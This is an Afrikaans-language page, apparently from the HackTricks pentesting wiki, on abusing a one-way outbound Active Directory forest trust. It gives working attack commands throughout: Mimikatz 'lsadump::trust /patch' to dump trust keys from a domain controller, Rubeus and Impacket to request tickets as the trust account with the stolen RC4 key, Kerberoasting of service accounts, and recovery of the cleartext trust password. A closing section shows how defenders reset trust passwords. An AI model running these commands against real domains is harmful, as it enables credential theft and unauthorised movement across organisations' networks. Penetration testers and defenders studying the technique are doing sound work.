# Eksterne Forest-domein - Eenrigting (Outbound)

{{#include ../../banners/hacktricks-training.md}}

In hierdie scenario **vertrou jou domein** sommige **privileges** aan principals van ’n **ander domein/forest**.

## Enumerasie

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
As jy die AD-module beskikbaar het, inspekteer ook die **Trusted Domain Object (TDO)** direk. Dit gee jou die rou LDAP-gesteunde trust-data wat jy later sal benodig wanneer jy besluit of die maklikste roete **FSP/group abuse** of **trust-account abuse** is:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Jy moet ook opteken waar die foreign principals van `CN=ForeignSecurityPrincipals` werklik toegang gekry het. Algemene wins sluit in:

- **Local admin** op ’n server/DC in jou huidige domain
- Lidmaatskap van ’n **custom domain group** wat ACLs oor users/computers/GPOs het
- Regte om **computer objects** te wysig, wat later [RBCD](resource-based-constrained-delegation.md) kan word indien die trust configuration dit toelaat

## Trust Account Attack

Wanneer ’n one-way trust vanaf domain/forest **B** na domain/forest **A** geskep word (**B trusts A**), word ’n **trust account** vir **B** in **A** geskep. In die outbound-trust-aansig van **A** is dit nuttig, want as jy later **B** (die trusting side) kompromitteer, kan jy die trust secret daar dump en terug na **A** authenticateer as `B$`.<sup>[[1]](#references)</sup>

Die kritieke aspek om hier te verstaan, is dat die password en Kerberos-materiaal vir daardie trust account uit ’n Domain Controller in die **trusting** domain geëkstraheer kan word deur:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Dit werk omdat die trust account wat in die **trusted** domain geskep is, ’n geaktiveerde principal is wat uiteindelik die basiese regte van ’n normale domain user daar verkry. Dit is dikwels genoeg om LDAP te begin enumerateer, tickets aan te vra en die volgende escalation path te vind.<sup>[[1]](#references)</sup>

In ’n scenario waar `ext.local` die **trusting** domain en `root.local` die **trusted** domain is, word ’n user account met die naam `EXT$` binne `root.local` geskep. Deur die trust keys vanaf `ext.local` te dump, word credentials onthul wat as `root.local\EXT$` teenoor `root.local` gebruik kan word:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Gebruik hierna die onttrekte **RC4**-sleutel om as `root.local\EXT$` binne `root.local` te autentiseer:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Enumerateer dan die vertroude domein as daardie principal, byvoorbeeld deur ’n hoëwaarde-SPN in `root.local` te Kerberoast:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Vanaf Linux

As jy die **RC4** trust-account key herwin het, werk dieselfde idee vanaf Linux met Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
As **RC4** nie aanvaar word nie, val terug na die herstelde **cleartext password** (of afgelei **AES**-sleutels) en hergebruik die gewone [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md)- en [Kerberoast](kerberoast.md)-werkvloeie vanaf daardie foothold.

### Slaggate met sleutelmateriale

Moenie **trust keys** en **trust-account credentials** met mekaar verwar nie:<sup>[[1]](#references)</sup>

- In ’n one-way trust stoor albei kante ’n **TDO**, maar die werklike **`EXT$` user account** bestaan slegs in die trusted domain.
- Die huidige trust-account password word in die TDO trust secret (`NewPassword` / current trust key) weerspieël.
- Die **RC4** trust key is die maklikste artifact om met `asktgt` as die trust account te hergebruik; in standaardopstellings is dit gewoonlik die werkende enctype omdat die trust account dikwels ’n leë `msDS-SupportedEncryptionTypes` het.
- As jy in terme van **AES trust keys** dink, onthou dat hulle nie uitruilbaar is met die trust-account AES keys nie omdat die salts verskil.

Vir die tegniek op hierdie bladsy, verkies dus óf die gedumpte **RC4**-materiaal óf die herstelde **cleartext** password.<sup>[[1]](#references)</sup>

### Versameling van cleartext trust password

In die vorige vloei is die trust hash in plaas van die **cleartext password** gebruik (wat ook deur **mimikatz gedump** word).<sup>[[1]](#references)</sup>

Die cleartext password kan verkry word deur die \[ CLEAR ]-uitset van mimikatz vanaf heksadesimaal om te skakel en nulgrepe `\x00` te verwyder:<sup>[[1]](#references)</sup>

![Trust Account Attack - Versameling van cleartext trust password: Die cleartext password kan verkry word deur die ( CLEAR )-uitset van mimikatz vanaf heksadesimaal om te skakel en alle nulgrepe te verwyder...](<../../images/image (938).png>)

Wanneer ’n trust relationship geskep word, moet ’n password soms deur die gebruiker vir die trust ingetik word. In hierdie demonstrasie is die key die oorspronklike trust password en daarom leesbaar vir mense. Namate die key roteer (verstek: elke 30 dae), sal die cleartext gewoonlik ophou om leesbaar vir mense te wees, maar dit bly tegnies bruikbaar.<sup>[[1]](#references)</sup>

Die cleartext password kan gebruik word om gewone authentication as die trust account uit te voer, as ’n alternatief vir die aanvra van ’n TGT met die Kerberos secret key van die trust account. Hier word `root.local` vanaf `ext.local` navraag gedoen vir lede van `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Versameling van cleartext trust password: Die cleartext password kan gebruik word om gewone authentication as die trust account uit te voer, as ’n alternatief vir die aanvra van ’n TGT...](<../../images/image (792).png>)

### Praktiese beperkings

> [!WARNING]
> Trust accounts is ongemaklike principals. Interaktiewe logons soos **RUNAS / console / RDP** is nie die verwagte pad hier nie, en **NTLM**-authenticationpogings kan misluk met `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Beplan eerder vir **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Nota oor persistence / cleanup

As defenders besef dat die trusting domain gekompromitteer is, behoort hulle die trust secret aan **beide kante** te roteer met `netdom trust ... /resetOneSide ...`. Vanuit ’n operator se perspektief is dit belangrik omdat ’n **manual reset** die ou trust-material onmiddellik ongeldig maak, terwyl normale trust-password rotation die huidige/vorige waardes tydens rollover behou.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Verwysings

- [1] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 7) – Trust account-aanval – van trusting na trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Hersetting van ’n trust-wagwoord](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
